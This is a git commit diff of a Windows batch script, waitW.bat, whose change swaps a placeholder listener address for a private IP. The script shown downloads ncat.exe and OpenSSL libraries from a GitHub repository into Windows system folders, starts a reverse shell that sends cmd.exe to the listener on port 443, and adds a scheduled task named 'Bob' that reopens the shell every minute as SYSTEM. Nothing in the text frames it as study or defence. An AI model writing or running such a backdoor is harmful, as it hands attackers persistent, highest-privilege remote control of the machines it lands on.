fbb1d5267107712462180c4509ae0d403fa5e64b
Ax0my10rk <dapelly4@gmail.com>
2025-03-29 04:48:01 -0400

    Update waitW.bat

--- waitW.bat
+++ waitW.bat
@@ -3,8 +3,8 @@ curl -L -o "C:\Windows\Temp\ncat.exe" "https://github.com/Ax0my10rk/B/raw/refs/h
 curl -L -o "C:\Windows\SysWOW64\libcrypto-3.dll" "https://github.com/Ax0my10rk/B/raw/refs/heads/main/libcrypto-3.dll"
 curl -L -o "C:\Windows\SysWOW64\libssl-3.dll" "https://github.com/Ax0my10rk/B/raw/refs/heads/main/libssl-3.dll"
 timeout /t 1 >nul
-start "" /B "C:\Windows\Temp\ncat.exe" L.IP.DI.KALI 443 -e cmd.exe
-schtasks /create /tn "Bob" /tr "\"C:\Windows\Temp\ncat.exe\" L.IP.DI.KALI 443 -e cmd.exe" /sc minute /mo 1 /ru SYSTEM /rl HIGHEST /f
+start "" /B "C:\Windows\Temp\ncat.exe" 192.168.10.176 443 -e cmd.exe
+schtasks /create /tn "Bob" /tr "\"C:\Windows\Temp\ncat.exe\" 192.168.10.176 443 -e cmd.exe" /sc minute /mo 1 /ru SYSTEM /rl HIGHEST /f
 
 :: chiamante
 :: ncat.exe L.IP.DI.KALI 443 -e cmd.exe
